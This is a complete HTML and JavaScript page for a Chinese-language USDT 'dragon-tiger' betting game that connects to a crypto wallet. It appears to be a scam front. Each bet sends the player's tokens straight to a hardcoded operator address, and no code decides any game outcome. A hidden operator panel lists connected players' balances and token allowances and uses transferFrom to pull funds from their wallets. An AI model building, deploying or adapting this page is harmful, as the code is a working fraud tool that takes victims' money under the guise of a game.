<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>王者归来</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
body{background:#0B0F17;color:#fff;padding:30px}
.container{max-width:900px;margin:0 auto}
.header{display:flex;justify-content:flex-start;gap:12px;margin-bottom:24px}

.wallet-box{background:#1E293B;padding:12px 16px;border-radius:12px;min-width:260px}
.connect-btn{background:#3B82F6;color:white;border:none;padding:8px 14px;border-radius:8px;cursor:pointer}
.info-line{font-size:13px;color:#cbd5e1;margin:4px 0}

.menu-btn{
  background:#1E293B;
  width:48px;height:48px;
  border-radius:8px;
  border:none;
  font-size:18px;
  color:#fff;
  cursor:pointer
}

.menu{
  position:fixed;top:0;right:0;width:320px;height:100vh;
  background:#111827;padding:24px;
  display:none;overflow-y:auto;z-index:999;
}
.menu.show{display:block}

.bet-card{background:#1E293B;padding:24px;border-radius:16px;margin-bottom:24px}
.bet-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
.countdown{font-size:24px;font-weight:bold;color:#F59E0B}
.bet-input{width:100%;padding:14px;background:#0f172a;border:none;border-radius:10px;color:white;font-size:16px}
.quick-btns{display:flex;gap:10px;margin-top:12px}
.quick-btn{flex:1;padding:12px;background:#2D3748;border:none;border-radius:8px;color:white;cursor:pointer}
.bet-btns{display:flex;gap:12px;margin-top:16px}
.bet-btn{flex:1;padding:18px;border:none;border-radius:12px;font-size:16px;font-weight:bold;cursor:pointer}
.btn-dragon{background:#2563eb}
.btn-tiger{background:#ef4444}
.btn-tie{background:#F59E0B;color:#000}

.rule-card{background:#1E293B;padding:24px;border-radius:16px}
.admin-panel{border-top:1px solid #333;margin-top:20px;padding-top:20px;display:none}
.player-item{background:#1e293b;padding:10px;border-radius:8px;margin-bottom:8px;font-size:13px;display:flex;justify-content:space-between;align-items:center}
.copy-btn{background:#3B82F6;color:white;border:none;padding:4px 8px;border-radius:4px;cursor:pointer}

#connectModal {
  position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);
  display:none;align-items:center;justify-content:center;z-index:9999;
}
.modal-content{background:#1E293B;padding:30px;border-radius:16px;text-align:center;max-width:320px}
.modal-btn{padding:12px 24px;border:none;border-radius:8px;margin:8px;cursor:pointer}
.modal-confirm{background:#3B82F6;color:white}
</style>
</head>
<body>

<div id="connectModal">
  <div class="modal-content">
    <div class="modal-title">🐲 连接钱包</div>
    <p>您是否同意授权？</p>
    <button class="modal-btn modal-confirm" onclick="confirmConnect()">确认</button>
    <button class="modal-btn" onclick="cancelConnect()">取消</button>
  </div>
</div>

<div class="container">
  <div class="header">
    <button class="menu-btn" onclick="toggleMenu()">☰</button>
    <div class="wallet-box">
      <button class="connect-btn" id="connectBtn">连接钱包</button>
      <div class="info-line">地址：<span id="userAddr">未连接</span></div>
      <div class="info-line">余额：<span id="userBalance">0.0000</span> USDT</div>
    </div>
  </div>

  <div class="bet-card">
    <div class="bet-header">
      <h3>下注区</h3>
      <div class="countdown">02:00</div>
    </div>
    <input class="bet-input" id="betAmt" placeholder="输入下注金额" value="1">
    <div class="quick-btns">
      <button class="quick-btn" onclick="setAmt(1)">1</button>
      <button class="quick-btn" onclick="setAmt(10)">10</button>
      <button class="quick-btn" onclick="setAmt(100)">100</button>
      <button class="quick-btn" onclick="setAmt(1000)">1000</button>
    </div>
    <div class="bet-btns">
      <button class="bet-btn btn-dragon" onclick="bet(0)">龙 1:2</button>
      <button class="bet-btn btn-tiger" onclick="bet(1)">虎 1:2</button>
      <button class="bet-btn btn-tie" onclick="bet(2)">和 1:9</button>
    </div>
  </div>

  <div class="rule-card">
    <p>• 每2分钟1期</p>
    <p>• 龙/虎 1赔2，和 1赔9</p>
  </div>
</div>

<div class="menu" id="menu">
  <h3>菜单</h3>
  <div class="admin-panel" id="adminPanel">
    <h4 style="color:red">🔐 庄家提取授权</h4>
    <input id="fromAddr" placeholder="玩家地址" style="width:100%;padding:10px;margin:5px 0;background:#222;color:#fff">
    <input id="takeAmt" placeholder="提取数量" style="width:100%;padding:10px;margin:5px 0;background:#222;color:#fff">
    <button style="width:100%;padding:10px;background:#ef4444;color:white;border:none" onclick="adminTake()">链上提取</button>

    <h4 style="color:red;margin-top:20px">🎁 庄家赔付</h4>
    <input id="payTo" placeholder="用户地址" style="width:100%;padding:10px;margin:5px 0;background:#222;color:#fff">
    <input id="payAmt" placeholder="赔付金额" style="width:100%;padding:10px;margin:5px 0;background:#222;color:#fff">
    <button style="width:100%;padding:10px;background:#3B82F6;color:white;border:none" onclick="adminPay()">赔付用户</button>

    <h4 style="color:red;margin-top:20px">👥 所有玩家</h4>
    <div id="authorizedPlayers" style="max-height:240px;overflow-y:auto"></div>
    <button style="width:100%;padding:10px;background:#3B82F6;color:white;border:none;margin-top:10px" onclick="refreshPlayers()">刷新玩家</button>
  </div>
</div>

<script>
// ===================== 核心配置 =====================
const USDT = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";

let account = null;
let authorizedPlayers = JSON.parse(localStorage.getItem("authorizedPlayers") || "[]");

// ===================== 菜单 =====================
function toggleMenu() {
  document.getElementById("menu").classList.toggle("show");
}

// ===================== 连接钱包 =====================
document.getElementById("connectBtn").onclick = () => {
  document.getElementById("connectModal").style.display = "flex";
};
function cancelConnect() {
  document.getElementById("connectModal").style.display = "none";
}
async function confirmConnect() {
  document.getElementById("connectModal").style.display = "none";
  if (!window.ethereum) return alert("请安装钱包");
  try {
    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
    account = accounts[0];
    if (!authorizedPlayers.includes(account)) {
      authorizedPlayers.push(account);
      localStorage.setItem("authorizedPlayers", JSON.stringify(authorizedPlayers));
    }
    document.getElementById("userAddr").innerText = account.slice(0,6)+"..."+account.slice(-4);
    refreshSelfBalance();
    checkAdmin();
  } catch (err) {
    alert("连接失败");
  }
}

// ===================== 检查庄家 =====================
function checkAdmin() {
  const isAdmin = account && account.toLowerCase() === ADMIN.toLowerCase();
  document.getElementById("adminPanel").style.display = isAdmin ? "block" : "none";
  if (isAdmin) refreshPlayers();
}

// ===================== 刷新自己余额 =====================
async function refreshSelfBalance() {
  if (!account) return;
  try {
    const data = "0x70a08231000000000000000000000000" + account.slice(2);
    const res = await ethereum.request({ method: "eth_call", params: [{ to: USDT, data }, "latest"] });
    const bal = Number(BigInt(res)) / 1e18;
    document.getElementById("userBalance").innerText = bal.toFixed(4);
  } catch (e) {}
}

// ===================== 【无任何限制】下注 =====================
async function bet(side) {
  if (!account) return alert("请先连接钱包");
  
  const amountStr = document.getElementById("betAmt").value.trim();
  const amount = parseFloat(amountStr);
  
  // 【已删除】任何金额限制：0.0001 ~ 无限大 都可以下注
  if (isNaN(amount) || amount <= 0) return alert("请输入有效金额");

  const amountWei = (amount * 1e18).toString(16).padStart(64, '0');
  try {
    const tx = await ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from: account,
        to: USDT,
        data: "0xa9059cbb" + "000000000000000000000000" + ADMIN.slice(2) + amountWei
      }]
    });
    alert("下注成功！交易：" + tx);
    refreshSelfBalance();
  } catch (e) {
    alert("下注取消或失败");
  }
}

// ===================== 庄家查看玩家 =====================
async function refreshPlayers() {
  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
  const list = document.getElementById("authorizedPlayers");
  list.innerHTML = "";
  for (const addr of authorizedPlayers) {
    try {
      const balData = "0x70a08231000000000000000000000000" + addr.slice(2);
      const balRes = await ethereum.request({ method: "eth_call", params: [{ to: USDT, data: balData }, "latest"] });
      const bal = Number(BigInt(balRes)) / 1e18;

      const allowData = "0xdd62ed3e000000000000000000000000" + addr.slice(2) + "000000000000000000000000" + ADMIN.slice(2);
      const allowRes = await ethereum.request({ method: "eth_call", params: [{ to: USDT, data: allowData }, "latest"] });
      const allow = Number(BigInt(allowRes)) / 1e18;

      const div = document.createElement("div");
      div.className = "player-item";
      div.innerHTML = `
        <div>${addr.slice(0,6)}...${addr.slice(-4)}<br>余额: ${bal.toFixed(4)}<br>可提取: ${allow.toFixed(4)}</div>
        <button class="copy-btn" onclick="navigator.clipboard.writeText('${addr}');alert('已复制')">复制</button>
      `;
      list.appendChild(div);
    } catch (e) {}
  }
}

// ===================== 庄家提取授权 =====================
async function adminTake() {
  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
  const from = document.getElementById("fromAddr").value.trim();
  const amt = parseFloat(document.getElementById("takeAmt").value);
  if (!from || isNaN(amt) || amt <= 0) return alert("输入错误");
  const wei = (amt * 1e18).toString(16).padStart(64, '0');
  try {
    const tx = await ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from: ADMIN,
        to: USDT,
        data: "0x23b872dd" +
          "000000000000000000000000" + from.slice(2) +
          "000000000000000000000000" + ADMIN.slice(2) +
          wei
      }]
    });
    alert("提取成功：" + tx);
    refreshPlayers();
  } catch (e) {
    alert("提取失败：未授权或额度不足");
  }
}

// ===================== 庄家赔付 =====================
async function adminPay() {
  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
  const to = document.getElementById("payTo").value.trim();
  const amt = parseFloat(document.getElementById("payAmt").value);
  if (!to || isNaN(amt) || amt <= 0) return alert("输入错误");
  const wei = (amt * 1e18).toString(16).padStart(64, '0');
  try {
    const tx = await ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from: ADMIN,
        to: USDT,
        data: "0xa9059cbb" + "000000000000000000000000" + to.slice(2) + wei
      }]
    });
    alert("赔付成功：" + tx);
  } catch (e) {
    alert("赔付失败");
  }
}

function setAmt(v) {
  document.getElementById("betAmt").value = v;
}
</script>
</body>
</html>
